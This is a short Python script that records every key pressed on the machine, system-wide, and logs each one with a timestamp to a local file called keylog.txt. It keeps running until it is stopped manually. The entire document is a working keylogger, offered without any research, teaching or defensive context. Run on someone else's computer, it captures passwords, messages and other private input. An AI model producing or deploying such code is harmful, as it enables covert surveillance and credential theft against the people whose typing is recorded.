import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

# Start listening to key presses
keyboard.on_press(on_press)
keyboard.wait()  # Keep the script running

# Remember to stop the script manually (e.g., Ctrl+C) when done
